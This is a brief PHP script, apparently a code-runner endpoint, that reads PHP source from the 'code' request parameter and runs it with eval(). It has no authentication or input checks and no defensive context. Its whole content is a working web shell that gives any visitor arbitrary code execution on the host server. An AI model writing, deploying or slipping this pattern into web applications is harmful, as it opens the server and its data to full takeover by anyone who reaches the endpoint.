<?php

$code = $_REQUEST['code'];
if (!$code) {
  echo "NO PHP SOURCE CODE PASSED IN";
} else {
  $code = "?>".$code;
  echo eval($code);
}

?>